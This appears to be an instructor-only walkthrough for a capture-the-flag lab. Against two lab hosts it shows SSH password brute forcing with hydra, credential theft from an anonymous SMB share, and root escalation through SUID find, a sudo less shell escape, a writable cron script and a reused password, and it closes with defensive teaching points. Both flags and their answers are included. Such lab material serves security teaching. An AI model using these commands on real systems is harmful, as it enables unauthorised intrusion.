# Week 8 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w8_suid_or_cron_root}`)

### Stage 1: Initial access — web recon for the username, then SSH weak-password brute force

```bash
docker exec -it week8-attacker bash
nmap -sV -p 22,80 10.10.8.10

# Port 80 is open — check it. The username is only in the HTML comment,
# not the rendered text.
curl http://10.10.8.10
# <!-- account: lowpriv -->

echo "password123" > /tmp/pw.txt
echo "sunshine1" >> /tmp/pw.txt
echo "letmein" >> /tmp/pw.txt
echo "admin123" >> /tmp/pw.txt
hydra -l lowpriv -P /tmp/pw.txt 10.10.8.10 ssh
# login: lowpriv   password: sunshine1

ssh lowpriv@10.10.8.10
# Password: sunshine1
```

### Stage 2: Escalation — two independent paths both lead here

**Path A — SUID `find` (GTFOBins):**
```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/find itself has the SUID bit set — not stock on Ubuntu
find . -exec /bin/sh -p \; -quit
whoami   # root
cat /root/user.txt
```

**Path B — Writable cron job:**
```bash
cat /etc/cron.d/backup
# * * * * * root /opt/scripts/backup.sh
ls -la /opt/scripts/backup.sh   # world-writable (777)
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'cp /root/user.txt /tmp/user.txt; chmod 644 /tmp/user.txt' >> /opt/scripts/backup.sh
# wait up to 60s for cron to fire
cat /tmp/user.txt
```

---

## Flag 2 — root.txt (`flag{w8_gtfobins_sudo_root}`)

### Stage 1: Initial access — SMB credential leak

```bash
nmap -sV -p 139,445 10.10.8.11
smbclient -L //10.10.8.11/ -N
# Sharename: notices

smbclient //10.10.8.11/notices -N
smb: \> get notice.txt
smb: \> exit
cat notice.txt
# "Login: deskuser / Winter2024!"

ssh deskuser@10.10.8.11
# Password: Winter2024!
```

### Stage 2: Escalation — two independent paths both lead here

**Path A — GTFOBins sudo escalation:**
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/hostname
# inside less: !/bin/sh
whoami   # root
cat /root/root.txt
```

**Path B — Hardcoded/reused credential:**
```bash
grep -ri password /etc/app/*.conf
# root_password=CorrectHorseBattery42
su root
# Password: CorrectHorseBattery42
cat /root/root.txt
```

---

## Teaching Points

- Always check the actual HTML source of a page, not just what renders —
  developers leave usernames, TODOs, and old comments in source all the
  time. `curl` shows you the source directly; `view-source:` does the same
  in a browser
- Weak/guessable passwords and anonymous SMB shares are still two of the
  most common ways real attackers get their first foothold — no exotic
  exploit needed, just a short, targeted password list or a share nobody
  locked down
- SUID binaries should be audited against GTFOBins before trusting them —
  a huge number of "boring" Unix binaries (find, vim, less, cp, python) have
  a documented privilege-escalation path when SUID or sudo NOPASSWD
- `sudo -l` costs nothing and should be the very first command run after any
  new shell — NOPASSWD entries are often instant root
- A world-writable script invoked by a root cron job is equivalent to
  handing out root access on a timer
- Credentials leak sideways constantly — a config file meant for one service
  (a database) directly unlocked root here via password reuse, and an IT
  helpdesk note leaked deskuser's own login in the first place
- None of the six vulnerabilities in this lab (2 initial-access, 4
  escalation) require a kernel exploit or anything exotic — every one of
  them is extremely common in real environments
